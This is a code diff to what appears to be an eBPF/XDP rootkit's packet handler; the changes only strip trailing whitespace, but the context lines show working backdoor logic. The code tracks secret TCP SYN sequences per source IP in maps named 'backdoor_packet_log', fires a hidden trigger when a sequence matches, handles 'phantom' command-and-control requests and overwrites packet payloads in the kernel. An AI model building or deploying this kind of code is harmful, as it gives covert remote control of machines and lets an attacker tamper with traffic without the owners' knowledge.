@@ -54,13 +54,13 @@ struct eth_hdr {
 /**
  * @brief Checks for the packet to be a phantom request
  * Returns 1 if it wants to stop the XDP pipeline.
- * 
- * @param payload 
- * @param payload_size 
- * @param data_end 
- * @param ip 
- * @param tcp 
- * @return __always_inline 
+ *
+ * @param payload
+ * @param payload_size
+ * @param data_end
+ * @param ip
+ * @param tcp
+ * @return __always_inline
  */
 static __always_inline int check_phantom_payload(char* payload, int payload_size, void* data_end, struct iphdr* ip, struct tcphdr* tcp){
     if (tcp_payload_bound_check(payload, payload_size, data_end)){
@@ -91,7 +91,7 @@ static __always_inline int check_phantom_payload(char* payload, int payload_size
 SEC("xdp_prog")
 int xdp_receive(struct xdp_md *ctx){
     //bpf_printk("BPF triggered\n");
-    
+
     void *data_end = (void *)(long)ctx->data_end;
     void *data = (void *)(long)ctx->data;
 
@@ -100,7 +100,7 @@ int xdp_receive(struct xdp_md *ctx){
     char *payload;
     struct tcphdr *tcp;
     struct iphdr *ip;
-    
+
     //Bound checking the packet before operating with it
     //Otherwise the bpf verifier will complain
     if(ethernet_header_bound_check(eth, data_end)<0){
@@ -111,7 +111,7 @@ int xdp_receive(struct xdp_md *ctx){
     ip = data + sizeof(*eth);
     if (ip_header_bound_check(ip, data_end)<0){
         bpf_printk("B");
-        return XDP_PASS;   
+        return XDP_PASS;
     }
 
     if (get_protocol(data) != IPPROTO_TCP){
@@ -139,7 +139,7 @@ int xdp_receive(struct xdp_md *ctx){
     //Yes, the verifier gets a bit angry when trying working with intervals in the payload
     //A chained if is also not good. A macro could be added for this kind of cases.
     if(payload_size == sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)){
-        ret_value = check_phantom_payload(payload, payload_size, data_end, ip, tcp);   
+        ret_value = check_phantom_payload(payload, payload_size, data_end, ip, tcp);
     }
     if(payload_size == sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)+1){
         ret_value = check_phantom_payload(payload, payload_size, data_end, ip, tcp);
@@ -180,7 +180,7 @@ int xdp_receive(struct xdp_md *ctx){
 
         ////32-bit 6-len streams
 
-        //SYN packet detected, store in bpf map. 
+        //SYN packet detected, store in bpf map.
         //When a full stream comes, then it will be analyzed and search whether it is a valid sequence
         //Known issue, ignored dliberately: IP sending packets to different ports classified as same communication
         //This way we may include some port-knocking like mechanism.
@@ -216,7 +216,7 @@ int xdp_receive(struct xdp_md *ctx){
                     b_new_data_32.trigger_array[2].seq_raw = tcp->seq;
                 }
                 bpf_map_update_elem(&backdoor_packet_log_32, &ipvalue, &b_new_data_32, BPF_ANY);
-                //If it was not the first packet received, this may be the end of the backdoor sequence (even if previous packets 
+                //If it was not the first packet received, this may be the end of the backdoor sequence (even if previous packets
                 //where for other purpose, we must still check it)
                 int ret = manage_backdoor_trigger_v3_32(b_new_data_32);
                 if(ret == 1){
@@ -273,7 +273,7 @@ int xdp_receive(struct xdp_md *ctx){
                     b_new_data_16.trigger_array[5].src_port = tcp->source;
                 }
                 bpf_map_update_elem(&backdoor_packet_log_16, &ipvalue, &b_new_data_16, BPF_ANY);
-                //If it was not the first packet received, this may be the end of the backdoor sequence (even if previous packets 
+                //If it was not the first packet received, this may be the end of the backdoor sequence (even if previous packets
                 //where for other purpose, we must still check it)
                 int ret = manage_backdoor_trigger_v3_16(b_new_data_16);
                 if(ret == 1){
@@ -293,7 +293,7 @@ int xdp_receive(struct xdp_md *ctx){
         bpf_printk("F, PS:%i, P:%i, DE:%i\n", payload_size, payload, data_end);
         return XDP_PASS;
     }
-    
+
     if (tcp_payload_bound_check(payload, payload_size, data_end)){
         bpf_printk("G");
         return XDP_PASS;
@@ -320,19 +320,19 @@ int xdp_receive(struct xdp_md *ctx){
         eth = ret.eth;
         if(ethernet_header_bound_check(eth, data_end)<0){
             bpf_printk("Bound check A failed while expanding\n");
-            return XDP_PASS; 
+            return XDP_PASS;
         }
 
         ip = ret.ip;
         if (ip_header_bound_check(ip, data_end)<0){
             bpf_printk("Bound check B failed while expanding\n");
-            return XDP_PASS;  
+            return XDP_PASS;
         }
 
         tcp = ret.tcp;
         /*if (get_protocol(data_end) != IPPROTO_TCP){
             bpf_printk("Bound check C failed while expanding\n");
-            return XDP_PASS; 
+            return XDP_PASS;
         }*/
 
         if (tcp_header_bound_check(tcp, data_end)){
@@ -342,7 +342,7 @@ int xdp_receive(struct xdp_md *ctx){
 
         payload_size = bpf_ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
         payload = (void *)tcp + tcp->doff*4;
-        
+
         //Quite a trick to avoid the verifier complaining when it's clear we are OK with the payload
         //Line 6367 https://lxr.missinglinkelectronics.com/linux/kernel/bpf/verifier.c
         if(payload_size < 0|| payload_size>88888){
@@ -367,7 +367,7 @@ int xdp_receive(struct xdp_md *ctx){
 
         int pattern_size = (int)sizeof(SUBSTITUTION_NEW_PAYLOAD)-1;
 
-        //Let's empty the payload so that the previous one does not appear 
+        //Let's empty the payload so that the previous one does not appear
         //even if it is larger than our new one.
         //Caution when doing this on some other place. The verifier is extremely picky on the size of this,
         //even if we know that there are empty bytes in futher positions.
@@ -398,13 +398,13 @@ int xdp_receive(struct xdp_md *ctx){
     //payload[1] = 'b';
     /*if(!payload){
 		bpf_probe_read_str(&rb_event->payload, sizeof(rb_event->payload), (void *)payload);
-		bpf_ringbuf_submit(rb_event, 0);	
+		bpf_ringbuf_submit(rb_event, 0);
 	}else{
 		//Submit it to user-space for post-processing
 		bpf_probe_read_str(&rb_event->payload, sizeof(rb_event->payload), (void*)0);
 		bpf_ringbuf_submit(rb_event, 0);
 	}*/
-	
+
 	// Same payload as secret one reeceived, pass it with modifications.
     return XDP_PASS;
 }
